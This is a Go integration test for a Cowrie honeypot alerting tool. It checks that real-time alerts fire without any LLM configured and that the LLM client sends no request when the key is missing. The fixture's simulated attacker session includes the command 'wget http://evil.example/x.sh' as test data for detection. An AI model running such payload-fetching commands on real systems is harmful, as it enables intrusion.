// E3 无 LLM 的实时采集与告警（SPEC §16 验收 8：实时告警独立于 LLM）。
//
// 完全不配置 LLM（不设 DEEPSEEK_API_KEY、不创建任何 llm.Client）：
// collector 与确定性规则引擎照常工作，蜜罐登录成功等高危事件立即告警；
// LLM 侧在 Key 缺失时不发任何网络请求（ErrNoAPIKey），互不影响。
package tests_test

import (
	"context"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/modenc/e3-security-analyst/internal/llm"
	"github.com/modenc/e3-security-analyst/internal/ntfy"
	"github.com/modenc/e3-security-analyst/internal/rules"
	"github.com/modenc/e3-security-analyst/internal/scheduler"
)

func TestE3RealtimeAlertsWithoutLLM(t *testing.T) {
	// 彻底移除 LLM 凭据（测试进程环境可能继承外部设置）。
	for _, key := range []string{"DEEPSEEK_API_KEY", "OPENAI_API_KEY"} {
		old, had := os.LookupEnv(key)
		os.Unsetenv(key)
		if had {
			t.Cleanup(func() { _ = os.Setenv(key, old) })
		}
	}

	dir := t.TempDir()
	ntfyM := newNtfyMock(t)
	// LLM server 指向一个必然失败的地址：本用例根本不该碰它。
	cfg := integrationCfg(dir, ntfyM.srv.URL, "http://127.0.0.1:1")
	loc := mustLoc(t, cfg)
	ctx := context.Background()

	since, _, err := scheduler.WindowFor(scheduler.KindDaily, time.Now(), loc)
	if err != nil {
		t.Fatalf("WindowFor: %v", err)
	}

	// 小型事件流：登录成功 + 文件上传（两类立即告警）+ 一条命令。
	ts := func(d time.Duration) string {
		return since.Add(d).UTC().Format("2006-01-02T15:04:05.000000Z07:00")
	}
	var b strings.Builder
	b.WriteString(`{"eventid":"cowrie.session.connect","timestamp":"` + ts(time.Hour) + `","session":"sess-x","src_ip":"198.51.100.7","src_port":50001,"message":"New connection"}` + "\n")
	b.WriteString(`{"eventid":"cowrie.login.success","timestamp":"` + ts(time.Hour+time.Minute) + `","session":"sess-x","src_ip":"198.51.100.7","src_port":50002,"username":"admin","message":"login succeeded"}` + "\n")
	b.WriteString(`{"eventid":"cowrie.command.input","timestamp":"` + ts(time.Hour+2*time.Minute) + `","session":"sess-x","src_ip":"198.51.100.7","src_port":50002,"input":"wget http://evil.example/x.sh","message":"CMD: wget"}` + "\n")
	b.WriteString(`{"eventid":"cowrie.session.file_upload","timestamp":"` + ts(time.Hour+3*time.Minute) + `","session":"sess-x","src_ip":"198.51.100.7","src_port":50002,"filename":"x.sh","shasum":"aabbccdd01","message":"Uploaded"}` + "\n")
	if err := os.MkdirAll(dir+"/logs", 0o755); err != nil {
		t.Fatalf("创建日志目录: %v", err)
	}
	if err := os.WriteFile(cfg.Cowrie.LogPath, []byte(b.String()), 0o644); err != nil {
		t.Fatalf("写入事件流: %v", err)
	}

	db := openTestDB(t, cfg.Database.Path)
	pub := ntfy.NewPublisher(
		ntfy.NewClient(ntfy.ClientConfig{BaseURL: cfg.Ntfy.BaseURL, Timeout: 5 * time.Second}),
		db, cfg.Ntfy.MaxRetries, cfg.Ntfy.MaxMessageBytes, discardLogger())
	engine := rules.New(cfg, db, pub, discardLogger())

	runCollectorUntil(t, cfg, db, engine, func() bool {
		return countEvents(t, db) == 4 && ntfyM.countByTitle("[E3蜜罐] 蜜罐模拟登录成功") == 1 &&
			ntfyM.countByTitle("[E3蜜罐] 蜜罐内文件上传") == 1
	}, "无 LLM 下事件入库 + 告警发送", 30*time.Second)

	if n := countEvents(t, db); n != 4 {
		t.Fatalf("events = %d, 期望 4（采集不受 LLM 缺失影响）", n)
	}
	// 登录成功立即高优 + 蜜罐语义文案。
	if reqs := ntfyM.requests(); len(reqs) != 3 {
		t.Fatalf("告警数 = %d, 期望 3（登录成功/首命令/文件上传）: %+v", len(reqs), alertTitles(reqs))
	}
	if n := ntfyM.countByTitle("[E3蜜罐] 蜜罐模拟登录成功"); n != 1 {
		t.Errorf("登录成功告警 = %d, 期望 1", n)
	}
	if n := ntfyM.countByTitle("[E3蜜罐] 蜜罐内文件上传"); n != 1 {
		t.Errorf("文件上传告警 = %d, 期望 1", n)
	}

	// 未配置 LLM：没有任何报告/分析运行被触发。
	if n := countRows(t, db, "reports"); n != 0 {
		t.Errorf("reports = %d, 期望 0（未尝试生成报告）", n)
	}
	if n := countRows(t, db, "analysis_runs"); n != 0 {
		t.Errorf("analysis_runs = %d, 期望 0", n)
	}

	// LLM 侧佐证：Key 缺失时客户端直接报 ErrNoAPIKey，不发网络请求。
	noKeyLLM := newLLMMock(t) // 若误发请求也会被记录
	client := llm.NewClient(llm.ClientConfig{
		BaseURL: noKeyLLM.srv.URL, Model: "mock-model", APIKey: "", Timeout: 5 * time.Second,
	})
	if _, err := client.Run(ctx, llm.RunRequest{UserPrompt: "x"}); err == nil {
		t.Error("空 Key 应返回错误")
	} else if !strings.Contains(err.Error(), "API key") {
		t.Errorf("错误应说明 Key 缺失: %v", err)
	}
	if n := len(noKeyLLM.requests()); n != 0 {
		t.Errorf("空 Key 不应发出任何请求, 实际 %d", n)
	}
}
